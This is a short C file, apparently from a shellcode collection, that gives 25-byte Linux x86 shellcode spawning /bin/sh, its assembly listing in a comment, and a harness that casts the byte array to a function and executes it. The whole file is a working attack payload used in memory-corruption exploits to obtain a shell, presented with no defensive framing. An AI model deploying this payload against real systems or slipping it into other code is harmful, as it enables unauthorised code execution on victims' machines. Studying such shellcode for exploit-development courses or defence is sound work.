/*
 * (linux/x86) /bin/sh shellcode --25 bytes--
	_start:
		xor	edx, edx
		push	edx
		push	0x68732f6e ;//bin/sh
		push	0x69622f2f
		mov	ebx, esp
		push	edx
		push	ebx
		mov	ecx, esp
		push	0xb
		pop   	eax
		int   	0x80

*/

#include <stdio.h>

char shellcode[] = "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x6a\x0b\x58\xcd\x80";

int main(void)
{
	printf("size = %d\n", sizeof(shellcode));
	(*(void(*)())shellcode)();
}
